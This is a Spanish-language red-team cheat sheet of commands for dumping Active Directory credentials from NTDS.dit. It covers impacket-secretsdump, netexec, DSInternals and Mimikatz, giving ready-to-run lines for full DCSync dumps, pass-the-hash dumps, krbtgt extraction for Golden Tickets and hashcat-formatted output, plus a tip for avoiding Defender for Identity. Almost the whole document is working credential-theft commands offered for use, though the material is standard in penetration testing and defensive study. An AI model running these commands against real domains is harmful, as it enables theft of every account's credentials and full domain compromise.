---
aliases:
  - NTDS Tooling
  - DSInternals tools
tags:
  - technique/credential-access
  - env/windows
  - asset/active-directory
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: SubCheatSheet
linked:
  - "[[NTDS.dit Extraction]]"
  - "[[secretsdump]]"
---
# NTDS.dit Extraction - Tooling

---

## impacket-secretsdump

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-secretsdump corp/admin:pass@DC` | Full remote dump (DCSync) | DA creds, remote. |
| `impacket-secretsdump -hashes :NT corp/admin@DC` | Remote con PtH | Hash sin password. |
| `impacket-secretsdump corp/admin:pass@DC -just-dc` | Solo NTDS (skip SAM/LSA) | Enfocado AD. |
| `impacket-secretsdump corp/admin:pass@DC -just-dc-ntlm` | Solo NT hashes | Rápido + chico. |
| `impacket-secretsdump corp/admin:pass@DC -just-dc-user krbtgt` | Solo krbtgt | Golden Ticket. |
| `impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL` | Offline parse ntds.dit | Post-VSS copy. |
| `impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY LOCAL` | SAM + LSA Secrets offline | Local DC hashes. |
| `impacket-secretsdump corp/admin:pass@DC -outputfile out` | Output files `out.ntds` etc. | Pipeline. |
^ntds-tool-secretsdump

```bash
# Install
pip install impacket  # o
sudo apt install python3-impacket

# Uso mínimo post-DA
impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-dc-ntlm
```

---

## nxc / netexec

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <DC> -u admin -p pass --ntds` | Full domain dump | Preferred — output limpio. |
| `nxc smb <DC> -u admin -H NT --ntds` | Dump via PtH | Hash only. |
| `nxc smb <DC> -u admin -p pass --ntds drsuapi` | Forzar DCSync method | Default. |
| `nxc smb <DC> -u admin -p pass --ntds vss` | Forzar VSS method | Alternativa si MDI. |
| `nxc smb <DC> -u admin -p pass --ntds --enabled` | Solo enabled accounts | Cleaner output. |
| `nxc smb <DC> -u admin -p pass --ntds --users` | Hashes + user metadata | Con descripción/flags. |
^ntds-tool-nxc

```bash
# Quick da dump
nxc smb dc01.corp.local -u administrator -p 'P@ssw0rd' --ntds --enabled

# Output en: ~/.nxc/logs/
ls ~/.nxc/logs/ | grep ntds
```

---

## DSInternals (PowerShell)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Install-Module DSInternals -Force` | Instalar | Setup. |
| `Get-BootKey -SystemHivePath '.\SYSTEM'` | Extraer BootKey | Required step 1. |
| `Get-ADDBAccount -All -DatabasePath '.\ntds.dit' -BootKey $key` | Todos los objetos AD | Full offline. |
| `Get-ADDBAccount -All ... \| Format-Custom -View HashcatNT` | hashcat NT format | Pre-crack. |
| `Get-ADDBAccount -SamAccountName krbtgt ... -BootKey $key` | Objeto krbtgt | Golden Ticket. |
| `Test-PasswordQuality -DatabasePath '.\ntds.dit' -BootKey $key -WeakPasswordHashesSortedFile hibp.txt` | Audit calidad de passwords | Report. |
| `Get-ADDBDomainController -DatabasePath '.\ntds.dit'` | DC metadata desde DB | Recon offline. |
^ntds-tool-dsinternals

```powershell
# Install + full parse
Install-Module DSInternals -Force
$key = Get-BootKey -SystemHivePath '.\SYSTEM'
Get-ADDBAccount -All -DatabasePath '.\ntds.dit' -BootKey $key |
  Format-Custom -View HashcatNT |
  Out-File .\hashes_hashcat.txt
```

---

## Mimikatz lsadump (on DC)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `lsadump::dcsync /domain:corp.local /all /csv` | DCSync completo CSV | On-host DA. |
| `lsadump::dcsync /domain:corp.local /user:krbtgt` | Solo krbtgt hash | Golden Ticket prep. |
| `lsadump::dcsync /domain:corp.local /user:administrator` | Solo admin | Targeted. |
| `lsadump::lsa /patch` | LSA Secrets + SAM (requiere SYSTEM en DC) | Local DC dump. |
| `lsadump::sam` | SAM local del DC | Local hashes. |
| `lsadump::cache` | Domain cached credentials (mscash) | Offline logon hashes. |
^ntds-tool-mimi

```
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

---

## Otras herramientas

| **Tool** | **Uso** | **Cuándo** |
|:---:|:---:|:---:|
| `NTDSDumpEx.exe` | Windows-native offline parse | Windows-only target. |
| `SharpSecDump` | C# secretsdump-like desde Windows | C2 / no impacket. |
| `CrackMapExec` (legacy) | Alias de nxc en entornos más viejos | Soporta `--ntds`. |
| `pypykatz registry` | SAM/SECURITY offline parse en Linux | Sin impacket LOCAL. |
| `Rubeus asktgt + dcsync` | Kerberos-based DCSync setup | Específico. |
^ntds-tool-other

---

## Recursos

| **Recurso** | **URL** |
|:---:|:---:|
| impacket | `https://github.com/fortra/impacket` |
| netexec | `https://github.com/Pennyw0rth/NetExec` |
| DSInternals | `https://github.com/MichaelGrafnetter/DSInternals` |
| NTDSDumpEx | `https://github.com/zcgonvh/NTDSDumpEx` |
| HackTricks — NTDS.dit | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ntds.dit` |
| The Hacker Recipes — NTDS | `https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds` |
| MITRE ATT&CK T1003.003 | `https://attack.mitre.org/techniques/T1003/003/` |
^ntds-tool-resources

---
